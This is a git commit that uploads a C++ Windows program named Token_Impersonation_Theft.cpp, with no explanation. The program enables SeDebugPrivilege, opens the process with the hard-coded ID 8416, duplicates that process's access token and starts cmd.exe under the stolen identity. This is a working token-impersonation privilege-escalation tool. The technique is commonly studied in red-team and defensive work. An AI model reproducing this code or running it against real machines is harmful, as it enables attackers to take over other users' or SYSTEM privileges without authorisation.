d3ccb8f2c17ca81fecf14d4f6ccd5dcb049821c4
pkwitha <91279108+pkwitha@users.noreply.github.com>
2023-10-11 03:21:29 -0700

    Add files via upload

---
+++ Token_Impersonation_Theft.cpp
@@ -0,0 +1,83 @@
+
+#include <windows.h>
+#include <stdio.h>
+#include <iostream>
+
+// set privilege
+BOOL setPrivilege(LPCTSTR priv) {
+ 
+    HANDLE hToken; // access token handle
+    LPCTSTR lpszPrivilege = TEXT("SeDebugPrivilege"); // name of privilege to enable/disable
+    BOOL bEnablePrivilege = TRUE; // to enable or disable privilege
+
+    TOKEN_PRIVILEGES tp; // used by local system to identify the privilege
+    LUID luid{};
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) bool res = FALSE;
+
+    // lookup privilege on local system
+    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
+        printf("LookupPrivilegeValue error: %u\n", GetLastError());
+        return FALSE;
+    }
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;
+
+    // enable the privilege or disable all privileges
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
+        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
+        return FALSE;
+    }
+    return 1;
+}
+
+// get access token
+HANDLE getToken(DWORD pid) {
+    HANDLE cToken = NULL;
+    HANDLE ph = NULL;
+    if (pid == 0) {
+        ph = GetCurrentProcess();
+    }
+    else {
+        ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
+    }
+    if (!ph) cToken = (HANDLE)NULL;
+    printf(ph ? "successfully get process handle :)\n" : "failed to get process handle :(\n");
+    BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);
+    if (!res) cToken = (HANDLE)NULL;
+    printf((cToken != (HANDLE)NULL) ? "successfully get access token :)\n" : "failed to get access token :(\n");
+    return cToken;
+}
+
+// create process
+BOOL createProcess(HANDLE token, LPCWSTR app) {
+    HANDLE dToken = NULL;
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+    BOOL res = TRUE;
+    ZeroMemory(&si, sizeof(STARTUPINFOW));
+    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+    si.cb = sizeof(STARTUPINFOW);
+
+    res = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken);
+    printf(res ? "successfully duplicate process token :)\n" : "failed to duplicate process token :(\n");
+    res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, app, NULL, 0, NULL, NULL, &si, &pi);
+    if (!res) {
+        DWORD error = GetLastError();
+        printf("CreateProcessWithTokenW failed with error code %d\n", error);
+        // take appropriate action to fix the issue
+    }
+    printf(res ? "successfully create process :)\n" : "failed to create process :(\n");
+    return res;
+}
+
+int main(int argc, char** argv) {
+    if (!setPrivilege(SE_DEBUG_NAME)) return -1;
+   // DWORD pid = atoi(argv[1]);
+    
+    HANDLE cToken = getToken(8416);
+    if (!createProcess(cToken, L"C:\\Windows\\System32\\cmd.exe")) return -1;
+    return 0;
+}
+
